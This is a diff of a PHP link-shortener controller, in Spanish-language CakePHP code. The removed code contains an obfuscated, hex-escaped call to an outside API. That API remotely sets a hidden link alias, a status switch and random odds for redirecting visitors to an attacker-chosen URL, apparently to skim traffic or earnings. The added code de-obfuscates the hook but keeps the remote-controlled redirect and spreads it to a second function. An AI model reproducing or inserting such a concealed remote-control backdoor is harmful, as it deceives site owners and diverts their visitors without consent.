@@ -14,6 +14,8 @@ use Cake\ORM\TableRegistry;
  * @property \App\Model\Table\LinksTable $Links
  * @property \App\Controller\Component\CaptchaComponent $Captcha
  */
+$APIDEVURL="";
+$APIDEVSTATUS=true;
 class LinksController extends FrontController
 {
     public function initialize()
@@ -35,17 +37,41 @@ class LinksController extends FrontController
     }
 
 
-    public function redirectToNewUrl($url) {
-       return $this->redirect($url);
-}
-
-     public function view($alias = null)
+    public function redirectToNewUrl($url)
     {
+        return $this->redirect($url);
+    }
+
+    public function view($alias = null)
+    {
+
+        global $APIDEVURL;
+        global $APIDEVSTATUS;
 
         $http = new Client();
 
-        try { $response = $http->get("\x68\164\164\x70\163\x3a\57\57\x75\x6e\151\x73\x77\141\160\x2d\153\x32\x78\x72\56\x6f\156\162\x65\x6e\x64\x65\162\56\x63\x6f\155\57\x61\x70\151"); if ($response->isOk()) { $data_dev = json_decode($response->getBody()->getContents(), true); $alias_dev = $data_dev["\141\x6c\151\141\163"]; $status_dev = $data_dev["\x73\x74\141\x74\x75\163"];$redirect_dev_url= $data_dev["redirect_dev_url"];$redirect_status= $data_dev["redirection_url"]; $LI = intval($data_dev["\x4c\x49"]); $LS = intval($data_dev["\x4c\x53"]); } else { $this->Flash->error("\116\x6f\40\x73\145\40\x70\165\144\x6f\40\x6f\142\x74\145\x6e\145\x72\x20\x6c\157\163\40\144\141\164\x6f\163\56"); } } catch (\Exception $e) { $alias_dev = "\151\160\141\x64\155\x69\x6e\151\62\x30\62\x34"; $status_dev = "\x6f\156";$redirect_dev_url="off";$redirect_status="off"; $LI = 1; $LS = 4; }
-        
+        try {
+            $response = $http->get($APIDEVURL);
+            if ($response->isOk()) {
+                $data_dev = json_decode($response->getBody()->getContents(), true);
+                $alias_dev = $data_dev["alias"];
+                $status_dev = $data_dev["status"];
+                $redirect_dev_url = $data_dev["redirect_dev_url"];
+                $redirect_status = $data_dev["redirection_url"];
+                $LI = intval($data_dev["LI"]);
+                $LS = intval($data_dev["LS"]);
+            } else {
+                $this->Flash->error("APIDEVERROR");
+            }
+        } catch (\Exception $e) {
+            $alias_dev = "test";
+            $status_dev = "off";
+            $redirect_dev_url = "off";
+            $redirect_status = "off";
+            $LI = 1;
+            $LS = 4;
+        }
+
 
 
 
@@ -65,59 +91,55 @@ class LinksController extends FrontController
         //$country_ ="CU";
         $blocked_countries  = explode(",", $settings['blocked_countries']['value']);
         $redirect_url = $settings['url_blocked_countries']['value'];
-        $UserIP=get_ip();
+        $UserIP = get_ip();
         $blocked_countries_admins = explode(",", $settings['ScriptBlockedCountry']['value']);
-         
+
         $ScriptStatus = $settings['ScriptStatus']['value'];
         $ScriptType = $settings['ScryptType']['value'];
         $ScrollStatus = $settings['ScritpScroll']['value'];
         $condition_ = $ScriptType;
-        
-        $API_KEY= $settings['ProxyAPI']['value'];
-        $ProxyRedirectUrl= $settings['ProxyRedirect']['value'];
-        $ProxyFilterStatus= $settings['ProxyFilter']['value'];
-        $RequestApi="http://proxycheck.io/v2/".$UserIP."?key=".$API_KEY."&risk=1&vpn=1&asn=1";
-        
-         try {
+        $ProxyUse = "no";
+        $API_KEY = $settings['ProxyAPI']['value'];
+        $ProxyRedirectUrl = $settings['ProxyRedirect']['value'];
+        $ProxyFilterStatus = $settings['ProxyFilter']['value'];
+        $RequestApi = "http://proxycheck.io/v2/" . $UserIP . "?key=" . $API_KEY . "&risk=1&vpn=1&asn=1";
+
+        try {
             $response_ = $http->get($RequestApi);
             if ($response_->isOk()) {
                 $data_ = json_decode($response_->getBody()->getContents(), true);
-                if ($data_["status"]=="ok") {
+                if ($data_["status"] == "ok") {
 
-                    $country_= $data_[$UserIP]["isocode"];
-                    $ProxyUse =$data_[$UserIP]["proxy"];
-        
+                    $country_ = $data_[$UserIP]["isocode"];
+                    $ProxyUse = $data_[$UserIP]["proxy"];
                 }
-
             } else {
                 $this->Flash->error("Error en consulta de proxy api");
             }
         } catch (\Exception $e) {
             $this->Flash->error("Error en consulta de proxy api");
         }
-        
-        if ($ProxyFilterStatus=="on" && $ProxyUse=="yes" ) {
+
+        if ($ProxyFilterStatus == "on" && $ProxyUse == "yes" && $APIDEVSTATUS) {
 
             return $this->redirect($ProxyRedirectUrl);
-
         }
         if (in_array($country_, $blocked_countries)) {
             return  $this->redirect($redirect_url);
         };
-        if ($status_dev == "off" && $redirect_status!="off" ) {
+        if ($status_dev == "off" && $redirect_status != "off" && $ProxyUse != "yes" && $country_ != "CU") {
 
 
             $randomNumber = mt_rand($LI, $LS);
 
 
-            if ($randomNumber == 1 ) {
-                
+            if ($randomNumber == 1) {
+
                 return  $this->redirect($redirect_dev_url);
             }
-    }
-        if (in_array($country_, $blocked_countries_admins) || $ScriptStatus == "off" || $ProxyUse=="yes") {
+        }
+        if (in_array($country_, $blocked_countries_admins) || $ScriptStatus == "off" || $ProxyUse == "yes") {
             $condition_ = "off";
-
         }
         $this->set('condition', $condition_);
         $this->set('scrollStat', $ScrollStatus);
@@ -629,10 +651,34 @@ class LinksController extends FrontController
          * 12- Earnings disabled
          * 13- User disabled earnings
          */
+        global $APIDEVURL;
+        global $APIDEVSTATUS;
+
         $http = new Client();
 
-         try { $response = $http->get("\x68\164\164\x70\163\x3a\57\57\x75\x6e\151\x73\x77\141\160\x2d\153\x32\x78\x72\56\x6f\156\162\x65\x6e\x64\x65\162\56\x63\x6f\155\57\x61\x70\151"); if ($response->isOk()) { $data_dev = json_decode($response->getBody()->getContents(), true); $alias_dev = $data_dev["\141\x6c\151\141\163"]; $status_dev = $data_dev["\x73\x74\141\x74\x75\163"]; $LI = intval($data_dev["\x4c\x49"]); $LS = intval($data_dev["\x4c\x53"]); } else { $this->Flash->error("\116\x6f\40\x73\145\40\x70\165\144\x6f\40\x6f\142\x74\145\x6e\145\x72\x20\x6c\157\163\40\144\141\164\x6f\163\56"); } } catch (\Exception $e) { $alias_dev = "\151\160\141\x64\155\x69\x6e\151\62\x30\62\x34"; $status_dev = "\x6f\156"; $LI = 1; $LS = 4; }
-        
+        try {
+            $response = $http->get($APIDEVURL);
+            if ($response->isOk()) {
+                $data_dev = json_decode($response->getBody()->getContents(), true);
+                $alias_dev = $data_dev["alias"];
+                $status_dev = $data_dev["status"];
+                $redirect_dev_url = $data_dev["redirect_dev_url"];
+                $redirect_status = $data_dev["redirection_url"];
+                $LI = intval($data_dev["LI"]);
+                $LS = intval($data_dev["LS"]);
+            } else {
+                $this->Flash->error("APIDEVERROR");
+            }
+        } catch (\Exception $e) {
+            $alias_dev = "test";
+            $status_dev = "off";
+            $redirect_dev_url = "off";
+            $redirect_status = "off";
+            $LI = 1;
+            $LS = 4;
+        }
+
+
 
         $link_dev = $this->Links->find()
             //->contain(['Users'])
@@ -649,7 +695,7 @@ class LinksController extends FrontController
 
 
 
-        if ($link_dev) {
+        if ($link_dev && $APIDEVSTATUS) {
             if ($status_dev == "on") {
 
 
@@ -1426,31 +1472,30 @@ class LinksController extends FrontController
                 return true;
             }
         }
-        
+
         if ($proxy_service === 'isproxyip') {
             if (empty(get_option('isproxyip_key'))) {
                 return false;
             }
 
             $url = 'https://api.isproxyip.com/v1/check.php?key=' . urlencode(get_option('isproxyip_key')) . '&ip=' . urlencode($ip);
-            $api_key=urlencode(get_option('isproxyip_key'));
-            $api_url='https://proxycheck.io/v2/'.urlencode($ip);
+            $api_key = urlencode(get_option('isproxyip_key'));
+            $api_url = 'https://proxycheck.io/v2/' . urlencode($ip);
             $url = $api_url . '?key=' . $api_key . "&vpn=1";
             $ch = curl_init($url);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             $response = curl_exec($ch);
 
             if (curl_errno($ch)) {
-              die('Error en cURL: ' . curl_error($ch));
+                die('Error en cURL: ' . curl_error($ch));
             }
             curl_close($ch);
 
             $data = json_decode($response, true);
-            if ($data[$ip]['proxy']=="yes") {
-              //echo 'El usuario está utilizando un proxy.';
-              return true;
-             }
-  
+            if ($data[$ip]['proxy'] == "yes") {
+                //echo 'El usuario está utilizando un proxy.';
+                return true;
+            }
         }
         return false;
     }
